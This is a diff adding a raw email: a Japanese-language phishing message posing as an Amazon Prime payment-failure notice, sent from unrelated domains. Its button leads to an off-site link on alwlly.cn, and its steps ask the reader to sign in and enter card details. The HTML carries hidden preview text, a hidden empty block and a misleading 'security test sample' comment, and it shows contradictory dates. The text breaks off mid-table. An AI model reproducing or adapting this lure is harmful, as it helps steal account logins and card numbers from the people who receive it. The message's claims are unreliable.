@@ -1,0 +1,427 @@
+Delivered-To: silver.firefox+whither-jp@gmail.com
+Received: by 2002:a05:640c:a182:20b0:26a:2114:7ab with SMTP id v2-n2csp362996eiy;
+        Thu, 28 May 2026 04:54:35 -0700 (PDT)
+X-Forwarded-Encrypted: i=3; AFNElJ+FxoFA6cj0iV6l7TQBpeUmolCB1OtUQVtG0UWhcn5Jvk7UFGf/cI0R1s6rFd/vZbObXB9kuAMEkigq9Wnu+g==@gmail.com
+X-Received: by 2002:a17:907:c081:b0:bdc:8cab:e250 with SMTP id a640c23a62f3a-bdd25aee915mr1571380266b.11.1779969274950;
+        Thu, 28 May 2026 04:54:34 -0700 (PDT)
+ARC-Seal: i=2; a=rsa-sha256; t=1779969274; cv=pass;
+        d=google.com; s=arc-20240605;
+        b=BpArCWeIn40v0rsPgkONxHV0YRdp1y83esh+ScR/zv/gqv/iQsqLghCwA89Jv+O/cT
+         fFW6BUCJ+xPkPdKF/Et0ShJXdv0FdvcCbWn5x7QiBBMeQEjEuWNbzs7J3vxsKLNNCwf6
+         pj2jjOoEi8mIFU8K2GvfuNaeXv7fxIhnFy9q9Jb2K14Adf5T5CQ/V8a9z70qZ9I94DjH
+         204Kr01Rel1gT4sjBluIgWd0fva58Vb8bkCIPnQfS5ROoZuOIzlGwOOxFxDPLTF/shIM
+         IhEqpUdJ16Vwzk17KzDhDja7S39TfscOzjhWFVekp7SP5USOuDp/HKvWtALpv1333hrt
+         /pkw==
+ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
+        h=sender:message-id:date:subject:to:dkim-signature:from:mime-version
+         :feedback-id:dkim-signature:dkim-signature;
+        bh=L8JAHe89lBe5pLLhR/IC5Yxdw6Eaky+2/wwfUZmCwaA=;
+        fh=ENXOhFKW7CT4pn4Lz1vO6o5YQQdiV/Ih3E4yEdfzxpY=;
+        b=SeH7w8ffkAaq1jIjSd7cHHCLNirTLDp2c1LU8kCmhi6uPGpaqafnUCGSYXagy2171L
+         PhXeAJAA/CYnL+sxFTHsd3jiXOw7PXKoIg4xepSUjDg8Hz7CM1VVgNxWc7HIsNIVpNXi
+         GzudUvpXsFrclHN8mcyxvI4XOiz2UoHwFVJkm8jaUu+SuoUatOSV/SN9HEbhHbdgXQHZ
+         OfegPr4fZsB7+zU9eTk8+DwqVZyUmsaSPWjLljBpIYXdg+/fT7/PA2yty4LkzwifGg3H
+         sFdkoecIg59Sd7VdOJIsWZ1TCtSML48xycLOsX4p2nnW+gG3gjuvTHQVqqZEQbjo7PhK
+         T3+A==;
+        dara=google.com
+ARC-Authentication-Results: i=2; mx.google.com;
+       dkim=pass header.i=@cloudflare-email.net header.s=cf2024-1 header.b=hf62798a;
+       dkim=pass header.i=@whither.jp header.s=cf2024-1 header.b=OA2usxtO;
+       dkim=pass header.i=@waka.hpskizs.cn header.s=haugh header.b=JADuv9kc;
+       arc=pass (i=1 spf=pass spfdomain=waka.hpskizs.cn dkim=pass dkdomain=waka.hpskizs.cn);
+       spf=pass (google.com: domain of srs0=glfo=zd=waka.hpskizs.cn=mogamiichiro@whither.jp designates 104.30.8.228 as permitted sender) smtp.mailfrom="SRS0=glfO=zd=waka.hpskizs.cn=mogamiichiro@whither.jp"
+Return-Path: <SRS0=glfO=zd=waka.hpskizs.cn=mogamiichiro@whither.jp>
+Received: from i-cci.cloudflare-email.net (i-cci.cloudflare-email.net. [104.30.8.228])
+        by mx.google.com with ESMTPS id a640c23a62f3a-bddc6bc899dsi1046210066b.366.2026.05.28.04.54.33
+        for <silver.firefox+whither-jp@gmail.com>
+        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
+        Thu, 28 May 2026 04:54:34 -0700 (PDT)
+Received-SPF: pass (google.com: domain of srs0=glfo=zd=waka.hpskizs.cn=mogamiichiro@whither.jp designates 104.30.8.228 as permitted sender) client-ip=104.30.8.228;
+Authentication-Results: mx.google.com;
+       dkim=pass header.i=@cloudflare-email.net header.s=cf2024-1 header.b=hf62798a;
+       dkim=pass header.i=@whither.jp header.s=cf2024-1 header.b=OA2usxtO;
+       dkim=pass header.i=@waka.hpskizs.cn header.s=haugh header.b=JADuv9kc;
+       arc=pass (i=1 spf=pass spfdomain=waka.hpskizs.cn dkim=pass dkdomain=waka.hpskizs.cn);
+       spf=pass (google.com: domain of srs0=glfo=zd=waka.hpskizs.cn=mogamiichiro@whither.jp designates 104.30.8.228 as permitted sender) smtp.mailfrom="SRS0=glfO=zd=waka.hpskizs.cn=mogamiichiro@whither.jp"
+DKIM-Signature: v=1; a=rsa-sha256; s=cf2024-1; d=cloudflare-email.net; c=relaxed/relaxed;
+	h=Date:Subject:To:From:Feedback-ID:from:reply-to:cc:resent-date
+	:resent-from:resent-to:resent-cc:in-reply-to:references:list-id:list-help
+	:list-unsubscribe:list-unsubscribe-post:list-subscribe:list-post
+	:list-owner:list-archive; t=1779969274; x=1780574074; bh=L8JAHe89lBe5pLLhR/
+	IC5Yxdw6Eaky+2/wwfUZmCwaA=; b=hf62798anpqtyRuiRmpeCS1wxUyVTLkDKlU5ABMnoXYYY
+	ytqDPPudTOVjkv77wCHVM+9ZRlzREsQcTBDKrl4TjH/15D+z0vBH+dmNZz7pYa53wCN09EcKw33
+	oO2voul18McFeRr7+7h4uzfAybbxyJmO3UTeN1F+guUuc5icqmtPsuEDS39uGD3s+7Bae6rHZ44
+	9BeJWSAb7fv9/PKs5jpSGaDV3eQcZXMy6SoqJIO5egij3IcYQK5Q3UYDa2/M5weYoOHrDpWZDYR
+	2MahSecPat93jSOaxaAFrRYktGyEyBPbUxClRVVVr4ncykA4WHy2DwPtMMUQFwTHwZB6eUTw==;
+DKIM-Signature: v=1; a=rsa-sha256; s=cf2024-1; d=whither.jp; c=relaxed/relaxed;
+	h=Date:Subject:To:From:Feedback-ID:from:reply-to:cc:resent-date
+	:resent-from:resent-to:resent-cc:in-reply-to:references:list-id:list-help
+	:list-unsubscribe:list-unsubscribe-post:list-subscribe:list-post
+	:list-owner:list-archive; t=1779969274; x=1780574074; bh=L8JAHe89lBe5pLLhR/
+	IC5Yxdw6Eaky+2/wwfUZmCwaA=; b=OA2usxtOuuj1PLI0ebd1HOjYmoe1IGN4UD1SKoXPZCoO4
+	na4HA3ay+l85/Djyt3xWdq9gUxJP4KkdF81rmI6aXgzk0184hwMfKdFtGdxfOPm4HWzS5i8Lwmz
+	yWaLuNd21yDxQtWQT+10f7qBhUaYOA3Ce9qp5XSNo0mBgWYZNi4i3nvxLx1dpP8EH0J3eBwAKiV
+	Elgra50fePrGiLxH0bIvG3fY5tWTre0i/MeriNrABPmyxGYOIUbMZQxxf3EgUZ7Go3Id+gixDuI
+	1GQ3gEdJSkYNqSrPxpIGtY03EXFFNONC0WRb8CmVlYcHyRduIU5susUCeLlFsefzn6MLiqNQ==;
+X-Forwarded-To: silver.firefox+whither-jp@gmail.com
+X-Forwarded-For: silver.firefox+whither-jp@gmail.com silver.firefox+whither-jp@gmail.com
+Feedback-ID: whither.jp:2:1:Cloudflare
+Received: from waka.hpskizs.cn (180.127.247.96)
+        by cloudflare-email.net (cloudflare) id PG1OZwwwAtHF
+        for <penguin@whither.jp>; Thu, 28 May 2026 11:54:28 +0000
+ARC-Seal: i=1; a=rsa-sha256; s=cf2024-1; d=cloudflare-email.net; cv=none;
+	b=fOjlRbGl+m4wUNQ/GqOnbg3M3EJ/ToRAtv3Y6+1YxWUx18hhXhApsyFvltNOfS8/POXow5FFp
+	bQJ4UBcM6xk+fNWLni2p1f2y2o5MYFWBcIxUtYJTJo3yM7ylxKezPHrbPSH59ImYtTwGQJ6MC4G
+	BS5H6xB/7rkwBvQ6rAfUnDX2zeTkwjrjC2oD3PNuyizMnGUmxRI38WsyajOwoXHM3UyrWQetuef
+	jw1mDqilG7p0ghCQ06F1CECCTreStWp+WCLwxHY+kU6XXRB/zKMrJHXe4H3ckRhfRFshi62toVG
+	dImKjMpcc1LgWm+gm6wsIvIx+cD/YBHozXCV2FqGIJqA==;
+ARC-Message-Signature: i=1; a=rsa-sha256; s=cf2024-1; d=cloudflare-email.net; c=relaxed/relaxed;
+	h=Date:Subject:To:From:from:reply-to:cc:resent-date:resent-from:resent-to
+	:resent-cc:in-reply-to:references:list-id:list-help:list-subscribe
+	:list-post:list-owner:list-archive; t=1779969271; x=1780574071; bh=L8JAHe89
+	lBe5pLLhR/IC5Yxdw6Eaky+2/wwfUZmCwaA=; b=W66HT/+kZT9cVAkr7GQVs2im1SjkYrt6CfO
+	qnyN+s17SWZracNV03JS4VaRItHzfFHFwKSs8YTx/c7m1mUbo0wuC2QzAtPCazqrKXUPt6kwhT6
+	xfb1fDt9h0m3lZrsm36IIC9+D6FUXOVs1ld83G1bi6ZbyEokmKLpdnDKnocIbJ42HTCRwgRAhK+
+	zSNnZeSi2hA2cg3Eao4LDmGoap+SQJKN4Y5RZeyGnS5yySiBN6vdn/qjZiAfzQ0LzA1Alcta4Ij
+	HtK3baSVGNO2ngIRhTBxvK5jv4kcsZBF08nJLUJn7sg1rUu9728V9YfXeeH6deZ3Ke1jJvC9Vhs
+	XvpIN1g==;
+ARC-Authentication-Results: i=1; mx.cloudflare.net;
+	dkim=pass header.i=@waka.hpskizs.cn header.s=haugh header.b=JADuv9kc;
+	dmarc=none header.from=toitservices.com policy.dmarc=none;
+	spf=pass (mx.cloudflare.net: domain of postmaster@waka.hpskizs.cn designates 180.127.247.96 as permitted sender) smtp.helo=waka.hpskizs.cn;
+	spf=pass (mx.cloudflare.net: domain of mogamiichiro@waka.hpskizs.cn designates 180.127.247.96 as permitted sender) smtp.mailfrom=mogamiichiro@waka.hpskizs.cn;
+	arc=none smtp.remote-ip=180.127.247.96
+Received-SPF: pass (mx.cloudflare.net: domain of mogamiichiro@waka.hpskizs.cn designates 180.127.247.96 as permitted sender)
+	receiver=mx.cloudflare.net; client-ip=180.127.247.96; envelope-from="mogamiichiro@waka.hpskizs.cn"; helo=waka.hpskizs.cn;
+Authentication-Results: mx.cloudflare.net;
+	dkim=pass header.i=@waka.hpskizs.cn header.s=haugh header.b=JADuv9kc;
+	dmarc=none header.from=toitservices.com policy.dmarc=none;
+	spf=pass (mx.cloudflare.net: domain of postmaster@waka.hpskizs.cn designates 180.127.247.96 as permitted sender) smtp.helo=waka.hpskizs.cn;
+	spf=pass (mx.cloudflare.net: domain of mogamiichiro@waka.hpskizs.cn designates 180.127.247.96 as permitted sender) smtp.mailfrom=mogamiichiro@waka.hpskizs.cn;
+	arc=none smtp.remote-ip=180.127.247.96
+X-CF-SpamH-Score: 2
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="----=_PtqwCbuz_735_58AC9_95X63423.3271280N"
+From: =?utf-8?b?QeKAim3igIph4oCKeuKAim/igIpu?= <hoshikawachikara2004@toitservices.com>
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=waka.hpskizs.cn;
+ i=@waka.hpskizs.cn; q=dns/txt; s=haugh; t=1779969268; h=from : to :
+ subject : date : message-id;
+ bh=L8JAHe89lBe5pLLhR/IC5Yxdw6Eaky+2/wwfUZmCwaA=;
+ b=JADuv9kcnyANjm2kII60/W8PlvD01MU/Izbl/vbZ4pOs6XqJPDZN95gt768qEPY268gL1
+ sQRO6bb8GoxKgAfFL11LDIxA2zLatnainllg3OFjcJlGlm7ZBqXvWltG5qBZzKfV/tGDka5
+ JrgcreIpxJE5aAZ3h8CTFGhudmzgkl2zz7Lx27BKIBM8r9RHlkT0L0pojOQdX5aaxOuDXf0
+ FPzDHLAA5JIIMBpAatjeajVhb1DKgUa5bPeOSeda1l+JUYTDJ5UhIIOaEiaQBomQGRUWBgd
+ 5kxfhiFFKRW59PVZGGCf7wwy4GPeAuu04jkJGJyrKmQ1A/klGfGRNhCoMtSQ==
+To: <penguin@whither.jp>
+Subject: =?utf-8?b?44CQ6YeN6KaB44CRUHJpbWXlrprmnJ/jgqLjg4Pjg5fjg4fjg7zjg4jjgavjgaTjgYTjgabjga7jgYrnn6XjgonjgZs=?=
+Date: Thu, 28 May 2026 20:54:28 +0900
+Message-ID: <1779969268268@waka.hpskizs.cn>
+Sender: mogamiichiro@waka.hpskizs.cn
+X-mailer: YQeGt 6
+
+------=_PtqwCbuz_735_58AC9_95X63423.3271280N
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+
+っヤぅゴ庸銿醄暮つヲお鏥賔あ命ペ劝ゅ涎ぷ
+
+Amazonプライム会員のお支払いが処理できませんでした。今すぐお支払い方法をご確認ください。 
+
+ amazon 
+ .co.jp 
+ 
+ お客様サービス 
+
+ prime 
+ 会員サービス 
+ 
+ 要対応 
+
+ 重要なお知らせ：お客様のAmazonプライム会員費のお支払いが処理できませんでした。 
+
+ penguin@whither.jp様 
+
+ いつもAmazonプライムをご利用いただきありがとうございます。 
+
+ 誠に恐れ入りますが、お客様のAmazonプライム会員費（月額 
+ 600円（税込））のお支払いを処理することができませんでした。引き続きプライム特典をご利用いただくために、お支払い方法の更新をお願い申し上げます。 
+
+ ご請求の詳細
+
+ サービス名 
+ Amazonプライム（月額） 
+
+ ご請求金額 
+ 600円（税込） 
+
+ 請求日 
+ 2026-05-28 
+
+ お支払い状況 
+ 未払い 
+
+ お支払いが確認できない場合、2026年5月8日をもってAmazonプライム会員資格が一時停止となる場合がございます。特典の継続利用のため、お早めにご対応ください。 
+
+ お支払い方法を今すぐ更新する 
+
+ お支払い方法の更新手順：
+
+ 1 
+ 
+ 上記ボタンをクリックし、Amazonアカウントにサインインします。 
+
+ 2 
+ 
+ 「お支払い方法の管理」ページにて、有効なカード情報をご入力ください。 
+
+ 3 
+ 
+ 更新完了後、自動的に会員費の再請求が行われます。 
+
+ ご不明な点がございましたら、Amazonカスタマーサービスまでお気軽にお問い合わせください。 
+
+ 今後ともAmazonをよろしくお願いいたします。
+Amazonプライム 
+ カスタマーサービスチーム 
+
+ ! 
+ 
+ Amazonは、パスワードやクレジットカード番号などの個人情報をメールでお聞きすることは一切ございません。不審に思われた場合は、フィッシング詐欺として報告してください。 
+
+ このメールはAmazonプライム会員のお客様に自動送信されています。
+このアドレスへの返信は受け付けておりません（配信専用）。 
+
+ プライバシー規約 | 
+ ご利用条件 | 
+ プライム会員情報 
+
+ ? 
+ 2026 Amazon.com, Inc. or its affiliates.
+Amazon Japan G.K., 1-8-1 
+ Shimomeguro, Meguro-ku, Tokyo 153-0064, Japan.
+All rights 
+ reserved. Amazon, Prime and related logos are trademarks of Amazon.
+
+------=_PtqwCbuz_735_58AC9_95X63423.3271280N
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+MIME-Version: 1.0
+
+<!DOCTYPE html>
+<html lang="und">
+<head>
+  <!-- SECURITY_TEST_SAMPLE: parser compatibility fixture -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>っヤぅゴ庸銿醄暮つヲお鏥賔あ命ペ劝ゅ涎ぷ</title>
+<style>
+<![CDATA[
+  /* C27: suppress stacked borders inside mail root */
+  .rami-ensemiio-52 table, .rami-ensemiio-52 table td, .rami-ensemiio-52 table th { border: 0 !important; mso-border-alt: none !important; }
+  .rami-ensemiio-52 div, .rami-ensemiio-52 p, .rami-ensemiio-52 section, .rami-ensemiio-52 article { border: none !important; border-width: 0 !important; border-style: none !important; border-image: none !important; }
+]]>
+</style>
+</head>
+<body>
+<!-- Preheader (hidden preview text) -->
+<DIV 
+style="FONT-SIZE: 1px; OVERFLOW: hidden; COLOR: rgb(243,243,243); DISPLAY: none; MAX-HEIGHT: 0px">Amazonプライム会員のお支払いが処理できませんでした。今すぐお支払い方法をご確認ください。 
+</DIV><!-- Outer wrapper -->
+<TABLE width="100%" id=_cid0.6149077726262278 
+style="PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(243,243,243)" 
+border=0 cellSpacing=0 cellPadding=0>
+  <TBODY>
+  <TR>
+    <TD align=center><!-- Email container -->
+      <TABLE width=600 
+      style="OVERFLOW: hidden; MAX-WIDTH: 600px; BORDER-TOP: rgb(221,221,221) 1px solid; BORDER-RIGHT: rgb(221,221,221) 1px solid; WIDTH: 100%; BORDER-BOTTOM: rgb(221,221,221) 1px solid; BORDER-LEFT: rgb(221,221,221) 1px solid; BACKGROUND-COLOR: rgb(255,255,255); border-radius: 4px; border-image: none" 
+      border=0 cellSpacing=0 cellPadding=0><!-- ===== HEADER ===== -->
+        <TBODY>
+        <TR>
+          <TD 
+          style="PADDING-BOTTOM: 16px; PADDING-TOP: 16px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px; BACKGROUND-COLOR: rgb(35,47,62)">
+            <TABLE width="100%" border=0 cellSpacing=0 cellPadding=0>
+              <TBODY>
+              <TR>
+                <TD><SPAN 
+                  style="FONT-SIZE: 26px; FONT-FAMILY: Arial, sans-serif; FONT-WEIGHT: bold; COLOR: rgb(255,255,255); LETTER-SPACING: -0.5px">amazon</SPAN> 
+                  <SPAN 
+                  style="FONT-SIZE: 11px; FONT-FAMILY: Arial, sans-serif; FONT-WEIGHT: bold; COLOR: rgb(255,153,0)">.co.jp</SPAN> 
+                </TD>
+                <TD align=right><SPAN 
+                  style="FONT-SIZE: 11px; FONT-FAMILY: Arial, sans-serif; COLOR: rgb(170,170,170)">お客様サービス</SPAN> 
+                </TD></TR></TBODY></TABLE></TD></TR><!-- ===== PRIME BANNER ===== -->
+        <TR>
+          <TD 
+          style="PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px; BACKGROUND-COLOR: rgb(0,168,225)">
+            <TABLE width="100%" border=0 cellSpacing=0 cellPadding=0>
+              <TBODY>
+              <TR>
+                <TD><SPAN 
+                  style="FONT-SIZE: 13px; FONT-FAMILY: Arial, sans-serif; FONT-WEIGHT: bold; COLOR: rgb(255,255,255); LETTER-SPACING: 1px">prime</SPAN> 
+                  <SPAN 
+                  style='FONT-SIZE: 12px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; COLOR: rgb(214,240,255); MARGIN-LEFT: 8px'>会員サービス</SPAN> 
+                </TD>
+                <TD align=right><SPAN 
+                  style="FONT-SIZE: 11px; FONT-FAMILY: Arial, sans-serif; FONT-WEIGHT: bold; COLOR: rgb(255,255,255); PADDING-BOTTOM: 3px; PADDING-TOP: 3px; PADDING-LEFT: 8px; PADDING-RIGHT: 8px; BACKGROUND-COLOR: rgb(204,0,0); border-radius: 2px">要対応</SPAN> 
+                </TD></TR></TBODY></TABLE></TD></TR><!-- ===== ALERT STRIP ===== -->
+        <TR>
+          <TD 
+          style="PADDING-BOTTOM: 12px; PADDING-TOP: 12px; PADDING-LEFT: 20px; BORDER-LEFT: rgb(255,153,0) 4px solid; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(255,243,205)">
+            <P 
+            style='FONT-SIZE: 13px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; COLOR: rgb(133,100,4); MARGIN: 0px'><STRONG>重要なお知らせ：</STRONG>お客様のAmazonプライム会員費のお支払いが処理できませんでした。 
+            </P></TD></TR><!-- ===== BODY ===== -->
+        <TR>
+          <TD 
+          style="PADDING-BOTTOM: 24px; PADDING-TOP: 32px; PADDING-LEFT: 32px; PADDING-RIGHT: 32px"><!-- Greeting -->
+            <P 
+            style='FONT-SIZE: 15px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; COLOR: rgb(15,17,17); MARGIN: 0px 0px 20px; LINE-HEIGHT: 1.6'>penguin@whither.jp様 
+            </P>
+            <P 
+            style='FONT-SIZE: 14px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; COLOR: rgb(51,51,51); MARGIN: 0px 0px 16px; LINE-HEIGHT: 1.8'>いつもAmazonプライムをご利用いただきありがとうございます。 
+            </P>
+            <P 
+            style='FONT-SIZE: 14px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; COLOR: rgb(51,51,51); MARGIN: 0px 0px 20px; LINE-HEIGHT: 1.8'>誠に恐れ入りますが、お客様のAmazonプライム会員費（月額 
+            <STRONG>600円（税込）</STRONG>）のお支払いを処理することができませんでした。引き続きプライム特典をご利用いただくために、<STRONG>お支払い方法の更新</STRONG>をお願い申し上げます。 
+            </P><!-- Info box -->
+            <TABLE width="100%" 
+            style="MARGIN-BOTTOM: 24px; BORDER-TOP: rgb(224,224,224) 1px solid; BORDER-RIGHT: rgb(224,224,224) 1px solid; BORDER-BOTTOM: rgb(224,224,224) 1px solid; BORDER-LEFT: rgb(224,224,224) 1px solid; BACKGROUND-COLOR: rgb(248,248,248); border-radius: 4px; border-image: none" 
+            border=0 cellSpacing=0 cellPadding=0>
+              <TBODY>
+              <TR>
+                <TD 
+                style="PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px">
+                  <P 
+                  style='FONT-SIZE: 12px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; COLOR: rgb(118,118,118); MARGIN: 0px 0px 4px'>ご請求の詳細</P>
+                  <TABLE width="100%" style="MARGIN-TOP: 12px" border=0 
+                  cellSpacing=0 cellPadding=0>
+                    <TBODY>
+                    <TR>
+                      <TD 
+                      style='FONT-SIZE: 13px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; BORDER-BOTTOM: rgb(238,238,238) 1px solid; COLOR: rgb(85,85,85); PADDING-BOTTOM: 6px; PADDING-TOP: 6px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px'>サービス名</TD>
+                      <TD align=right 
+                      style='FONT-SIZE: 13px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; BORDER-BOTTOM: rgb(238,238,238) 1px solid; FONT-WEIGHT: bold; COLOR: rgb(15,17,17); PADDING-BOTTOM: 6px; PADDING-TOP: 6px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px'>Amazonプライム（月額）</TD></TR>
+                    <TR>
+                      <TD 
+                      style='FONT-SIZE: 13px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; BORDER-BOTTOM: rgb(238,238,238) 1px solid; COLOR: rgb(85,85,85); PADDING-BOTTOM: 6px; PADDING-TOP: 6px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px'>ご請求金額</TD>
+                      <TD align=right 
+                      style="FONT-SIZE: 13px; FONT-FAMILY: Arial, sans-serif; BORDER-BOTTOM: rgb(238,238,238) 1px solid; FONT-WEIGHT: bold; COLOR: rgb(204,0,0); PADDING-BOTTOM: 6px; PADDING-TOP: 6px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">600円（税込）</TD></TR>
+                    <TR>
+                      <TD 
+                      style='FONT-SIZE: 13px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; BORDER-BOTTOM: rgb(238,238,238) 1px solid; COLOR: rgb(85,85,85); PADDING-BOTTOM: 6px; PADDING-TOP: 6px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px'>請求日</TD>
+                      <TD align=right 
+                      style='FONT-SIZE: 13px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; BORDER-BOTTOM: rgb(238,238,238) 1px solid; COLOR: rgb(15,17,17); PADDING-BOTTOM: 6px; PADDING-TOP: 6px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px'>2026-05-28</TD></TR>
+                    <TR>
+                      <TD 
+                      style='FONT-SIZE: 13px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; COLOR: rgb(85,85,85); PADDING-BOTTOM: 6px; PADDING-TOP: 6px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px'>お支払い状況</TD>
+                      <TD align=right 
+                      style="FONT-SIZE: 13px; FONT-FAMILY: Arial, sans-serif; FONT-WEIGHT: bold; PADDING-BOTTOM: 6px; PADDING-TOP: 6px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px"><SPAN 
+                        style="COLOR: rgb(204,0,0)">未払い</SPAN> 
+                  </TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+            <P 
+            style='FONT-SIZE: 14px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; COLOR: rgb(51,51,51); MARGIN: 0px 0px 24px; LINE-HEIGHT: 1.8'>お支払いが確認できない場合、<STRONG>2026年5月8日</STRONG>をもってAmazonプライム会員資格が一時停止となる場合がございます。特典の継続利用のため、お早めにご対応ください。 
+            </P><!-- CTA Button -->
+            <TABLE width="100%" style="MARGIN-BOTTOM: 28px" border=0 
+            cellSpacing=0 cellPadding=0>
+              <TBODY>
+              <TR>
+                <TD align=center><A 
+                  style='FONT-SIZE: 14px; TEXT-DECORATION: none; BORDER-TOP: rgb(252,210,0) 1px solid; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; BORDER-RIGHT: rgb(252,210,0) 1px solid; BORDER-BOTTOM: rgb(252,210,0) 1px solid; FONT-WEIGHT: bold; COLOR: rgb(15,17,17); PADDING-BOTTOM: 12px; PADDING-TOP: 12px; PADDING-LEFT: 32px; BORDER-LEFT: rgb(252,210,0) 1px solid; DISPLAY: inline-block; LETTER-SPACING: 0.3px; PADDING-RIGHT: 32px; BACKGROUND-COLOR: rgb(255,216,20); border-radius: 8px; border-image: none' 
+                  href="https://alwlly.cn/iHHvGuK4AJ.com" target=_blank>お支払い方法を今すぐ更新する 
+            </A></TD>
+<div hidden aria-hidden="true" style="display:none !important;max-height:0;overflow:hidden;"><div role="group"><section></section><footer></footer></div></div>
+</TR></TBODY></TABLE><!-- Steps section -->
+            <TABLE width="100%" 
+            style="MARGIN-BOTTOM: 24px; BORDER-TOP: rgb(204,224,245) 1px solid; BORDER-RIGHT: rgb(204,224,245) 1px solid; BORDER-BOTTOM: rgb(204,224,245) 1px solid; BORDER-LEFT: rgb(204,224,245) 1px solid; BACKGROUND-COLOR: rgb(240,247,255); border-radius: 4px; border-image: none" 
+            border=0 cellSpacing=0 cellPadding=0>
+              <TBODY>
+              <TR>
+                <TD 
+                style="PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px">
+                  <P 
+                  style='FONT-SIZE: 13px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; FONT-WEIGHT: bold; COLOR: rgb(15,17,17); MARGIN: 0px 0px 12px'>お支払い方法の更新手順：</P>
+                  <TABLE width="100%" border=0 cellSpacing=0 cellPadding=0>
+                    <TBODY>
+                    <TR>
+                      <TD 
+                      style="WIDTH: 28px; VERTICAL-ALIGN: top; PADDING-BOTTOM: 4px; PADDING-TOP: 4px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px"><SPAN 
+                        style="FONT-SIZE: 11px; HEIGHT: 20px; FONT-FAMILY: Arial, sans-serif; WIDTH: 20px; FONT-WEIGHT: bold; COLOR: rgb(255,255,255); TEXT-ALIGN: center; DISPLAY: inline-block; LINE-HEIGHT: 20px; BACKGROUND-COLOR: rgb(0,168,225); border-radius: 50%">1</SPAN> 
+                      </TD>
+                      <TD 
+                      style='FONT-SIZE: 13px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; COLOR: rgb(51,51,51); PADDING-BOTTOM: 4px; PADDING-TOP: 4px; PADDING-LEFT: 0px; LINE-HEIGHT: 1.6; PADDING-RIGHT: 0px'>上記ボタンをクリックし、Amazonアカウントにサインインします。</TD></TR>
+                    <TR>
+                      <TD 
+                      style="WIDTH: 28px; VERTICAL-ALIGN: top; PADDING-BOTTOM: 4px; PADDING-TOP: 4px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px"><SPAN 
+                        style="FONT-SIZE: 11px; HEIGHT: 20px; FONT-FAMILY: Arial, sans-serif; WIDTH: 20px; FONT-WEIGHT: bold; COLOR: rgb(255,255,255); TEXT-ALIGN: center; DISPLAY: inline-block; LINE-HEIGHT: 20px; BACKGROUND-COLOR: rgb(0,168,225); border-radius: 50%">2</SPAN> 
+                      </TD>
+                      <TD 
+                      style='FONT-SIZE: 13px; FONT-FAMILY: "Hiragino Kaku Gothic ProN", "Meiryo", Arial, sans-serif; COLOR: rgb(51,51,51); PADDING-BOTTOM: 4px; PADDING-TOP: 4px; PADDING-LEFT: 0px; LINE-HEIGHT: 1.6; PADDING-RIGHT: 0px'>「お支払い方法の管理」ページにて、有効なカード情報をご入力ください。</TD></TR>
+                    <TR>
+                      <TD 
+                      style="WIDTH: 28px; VERTICAL-ALIGN: top; PADDING-BOTTOM: 4px; PADDING-TOP: 4px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px"><SPAN 
+                        style="FONT-SIZE: 11px; HEIGHT: 20px; FONT-FAMILY: Arial, sans-serif; WIDTH: 20px; FONT-WEIGHT: bold; COLOR: rgb(255,255,255); TEXT-ALIGN: center; DISPLAY: inline-block; LINE-HEIGHT: 20px; BACKGROUND-COLOR: rgb(0,168,225); border-radius: 50%">3</SPAN> 
+                      </TD>
+                      <TD 
